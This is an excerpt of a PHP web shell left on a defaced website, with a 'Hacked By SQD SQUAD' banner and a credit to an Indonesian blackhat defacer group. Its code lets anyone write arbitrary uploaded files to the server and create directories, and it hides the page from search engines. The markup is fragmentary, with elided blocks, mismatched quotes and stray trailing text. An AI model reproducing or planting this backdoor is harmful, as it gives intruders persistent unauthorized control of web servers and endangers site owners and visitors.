...
<html>
<head>
<title>Hacked By SQD SQUAD</title>
<meta name="robots" content="noindex,nofollow">
<meta name="description" content=" Maapin Yahhhhh :v ">
...
<body>
<center><b>- <font face="Kelly Slab" color="white" size="10">Hacked By SQD SQUAD</font> -</b></center>
...
// Upload form
echo '<br><br><font color="lime">
<form enctype="multipart/form-data" method="POST">
    Upload File: <input type="file" name="file" style="color:lime;border:2px solid lime;" required/>
    <input type="submit" value="UPLOAD" name="upload" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15;background:black;color: lime;border:2px solid lime;border-radius:5px"/>
</form>
</font>';
...
if(isset($_POST['upload']) && isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name'])){
        echo '<br><br><font color="lime">UPLOAD SUCCESS !!!!</font><br/>';
    } else {
        echo '<script>alert("File Gagal Diupload !!")</script>';
    }
}

// Form to create new directory
echo '<br><br>
<form action="" method="POST">
    New Directory Name: <input name="dirname" type="text" size="25" value="" style="width:300px; height: 30px;"/>
    <input type="submit" value="Create Directory" name="create_dir" style="width:150px; height: 30px;"/>
</form>';
...
if(isset($_POST['create_dir']) && isset($_POST['dirname'])){
    ...
    if(mkdir($newDirPath)){
        echo '<br><br><font color="lime">DIRECTORY CREATED SUCCESSFULLY !!</font><br/>';
    } else {
        echo '<script>alert("Create Directory Gagal !!")</script>';
    }
}
...
echo '<center><br/>
<font face="Kelly Slab" color="white" style="text-shadow:0 0 20px #00FAFF, 0 0 5px #00FAFF, 0 0 7px red, 0 0 45px #00FAFF; font-weight:bold: white; font-size:15px">2022 - 2023 Copyright Jawa Barat Blackhat || Defacer Indonesian</font>";
</body>
</html>
<nesia
</body>
